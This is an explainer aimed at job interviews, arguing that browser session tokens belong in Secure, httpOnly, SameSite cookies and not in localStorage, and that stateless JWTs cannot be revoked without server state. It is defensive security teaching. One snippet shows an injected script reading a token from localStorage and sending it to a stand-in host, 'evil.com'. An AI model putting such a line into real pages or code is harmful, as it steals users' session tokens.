# JWT vs Session Cookies — Stop Storing Tokens in localStorage

## The Interview Question

> "Why are you still using JWTs in localStorage for user sessions?"

"Because they're stateless" is the answer that walks you straight into the trap. The follow-up — *"so how do you revoke one?"* — is where most candidates fall apart. This piece is the debate, and the two questions everyone conflates into one.

> Sibling piece: [How Global Apps Keep You Logged In](../how-global-apps-keep-you-logged-in/) argues *why* JWTs are great for verifying a user across many servers. This piece is the other half — **where you store the token** and **how you kill it**. Read both.

---

## Two Questions Hiding Inside One

"JWT vs cookies" is a confused debate because it mashes together two *independent* decisions:

1. **Where do you store the token?** → `localStorage` vs an `httpOnly` cookie
2. **How do you revoke it?** → stateless JWT vs a server-side session

People pick "JWT in localStorage" thinking they answered one question. They actually answered both — badly.

---

## The Concert Wristband Analogy

A JWT is a concert wristband. Once security straps it on, the venue stops checking your ticket — the wristband *is* the proof. Fast and frictionless: no door has to call the box office.

But two problems:

- If someone **photographs and clones** your wristband, they walk in as you — and nobody notices.
- If the venue wants to **kick one person out**, there's no mechanism. The wristband is already on. Their only option is to post a "banned list" at every door and check it — which is exactly the box-office lookup the wristband was supposed to eliminate.

That's stateless auth in one image.

---

## Problem 1: localStorage Is Readable by Any Script

`localStorage` is plain JavaScript-accessible storage. Any script running on your page can read it:

```js
// This is all an attacker's injected script needs:
const token = localStorage.getItem('token');
fetch('https://evil.com/steal?t=' + token);
```

One **XSS** hole — a vulnerable dependency, a bad ad, a reflected input — and *every* user's token is exfiltrated. "I'll just delete it from localStorage on logout" doesn't help: the attacker copied it a second after login.

An **`httpOnly` cookie is invisible to JavaScript.** `document.cookie` can't see it; `localStorage` can't either. The same XSS that drains localStorage gets nothing.

---

## Problem 2: "Stateless" Means You Can't Revoke

Here's the death spiral the script acts out:

1. "I'll revoke by deleting the token from the client." → The token is **still valid on the backend** until it expires. An attacker who copied it still owns the account.
2. "Fine, I'll keep a blacklist of revoked tokens in Redis." → You now do a **lookup on every request**. Congratulations: you rebuilt server-side sessions, except messier and bolted-on.

**The moment you need real revocation, you need state. A denylist is just a session store wearing a stateless costume.**

---

## The Default You Should Reach For

For a **first-party browser session**, default to a **`Secure`, `httpOnly`, `SameSite` cookie**:

| | JWT in `localStorage` | `Secure` `httpOnly` cookie |
|---|---|---|
| Readable by JS (XSS theft) | ❌ Yes — fully exposed | ✅ No — invisible to JS |
| Sent automatically | ❌ You wire up every header | ✅ Browser attaches it |
| Instant revocation | ❌ Not without a denylist | ✅ Delete the server session |
| CSRF exposure | ✅ Low (not auto-sent) | ⚠️ Needs `SameSite` / CSRF token |

`Secure` (HTTPS only) + `httpOnly` (no JS) + `SameSite=Lax/Strict` (CSRF defense) gives you a token the browser guards for you, and revocation that's a single `DELETE` away.

---

## The Nuance That Makes You Sound Senior

**JWTs aren't the villain — `localStorage` plus "stateless = un-revocable" is.** JWTs are excellent for:

- **Service-to-service / API auth**, where there's no browser and no XSS surface.
- **Short-lived access tokens** (5–15 min) paired with a longer refresh token, so a stolen token expires fast and revocation only matters at refresh time.

And you can have both: store a JWT *inside* an `httpOnly` cookie. The enemy was never the token format — it was putting it somewhere JavaScript can read and pretending you'll never need to revoke it.

---

## Production Considerations

- **SPA on a separate API domain?** Cookies still work, but you need `SameSite=None; Secure` plus correct CORS (`credentials: 'include'`). Don't reach for localStorage just because cross-origin is fiddly.
- **CSRF** is the trade you take for auto-sent cookies — cover it with `SameSite` and/or a CSRF token. It's a solved problem; XSS token theft is the nastier one.
- **Refresh tokens** belong in an `httpOnly` cookie too, never localStorage.

---

## TL;DR

- **Don't** store auth tokens in `localStorage` — one XSS leaks every user's session. ([OWASP says this outright.](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html))
- "Delete it from the client" is **not** revocation — a stateless token stays valid until it expires.
- A Redis denylist is a session store in disguise; you didn't stay stateless, you just made it worse.
- **Default for browser sessions: `Secure`, `httpOnly`, `SameSite` cookies.** Keep JWTs for APIs and short-lived access tokens.

---

## Resources

### Docs
- [Session Management Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [JSON Web Token Cheat Sheet — OWASP](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
